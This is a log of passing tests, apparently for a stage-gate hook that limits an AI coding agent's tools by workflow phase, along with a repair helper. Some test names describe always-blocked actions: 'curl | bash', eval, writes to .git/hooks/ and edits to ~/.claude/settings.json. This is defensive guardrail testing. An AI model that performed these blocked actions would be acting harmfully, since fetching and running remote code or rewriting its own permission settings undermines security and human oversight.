+(pass) handleStageGateHook — ephemeral scratch (gated step) > allows Write to the platform tmpdir via tmpdirs [0.48ms]
+(pass) handleStageGateHook — ephemeral scratch (gated step) > allows Write to .luca/tmp/previews/<name> during learn [0.46ms]
+(pass) handleStageGateHook — ephemeral scratch (gated step) > allows opening the rendered preview in a browser during learn [0.51ms]
+(pass) handleStageGateHook — ephemeral scratch (gated step) > still blocks Write to a project HTML file during learn [0.42ms]
+(pass) handleStageGateHook — ephemeral scratch (gated step) > still denies the legacy /tmp/luca-* payload during learn [0.49ms]
+(pass) handleStageGateHook — FINALIZING > allows git commit [0.49ms]
+(pass) handleStageGateHook — FINALIZING > allows git push [0.46ms]
+(pass) handleStageGateHook — FINALIZING > blocks Edit on src/foo.ts (no code in FINALIZING) [0.42ms]
+(pass) handleStageGateHook — always-denied (any phase) > blocks Edit on .git/HEAD in EXECUTING [0.44ms]
+(pass) handleStageGateHook — always-denied (any phase) > blocks Bash with eval in any phase [0.46ms]
+(pass) handleStageGateHook — always-denied (any phase) > blocks curl | bash anywhere [0.44ms]
+(pass) handleStageGateHook — always-denied (any phase) > blocks Bash writing to .git/hooks/ [0.62ms]
+(pass) handleStageGateHook — always-denied (any phase) > blocks Edit on ~/.claude/settings.json with homedir option [0.48ms]
+(pass) handleStageGateHook — non-write tools (Read, Grep, Glob) > Read in PLANNING is allowed (not a write tool) [0.45ms]
+
+src/repair/helpers/run-repair.test.ts:
+(pass) runRepair > returns no-op result when .luca/ does not exist [0.55ms]
+(pass) runRepair > clears a stale lock (PID not running) [1.09ms]
+(pass) runRepair > preserves a lock held by a running PID [0.53ms]
+(pass) runRepair > reports state.json validation errors without auto-fixing [0.90ms]
+(pass) runRepair > reports a valid state.json without complaint [0.56ms]
+
+ 353 pass
+ 0 fail
+ 910 expect() calls
+Ran 353 tests across 41 files. [1.95s]
